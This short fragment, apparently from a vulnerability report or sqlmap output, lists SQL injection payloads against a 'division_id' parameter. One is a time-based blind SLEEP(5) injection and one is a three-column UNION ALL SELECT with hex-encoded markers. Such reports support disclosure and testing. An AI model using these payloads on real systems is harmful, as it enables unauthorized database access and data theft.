...
- **Type:** time-based blind
  ...
  - **Payload:** `division_id=1 AND (SELECT 6041 FROM (SELECT(SLEEP(5)))VFmL)`
- **Type:** UNION query
  - **Title:** Generic UNION query (NULL) - 3 columns
  - **Payload:** 
```
division_id=1 UNION ALL SELECT CONCAT(0x7178707671,0x6155436a4349416c44767a50685247536171464a51715a444e626476617051527548755058486550,0x717a767a71),NULL,NULL-- -
```
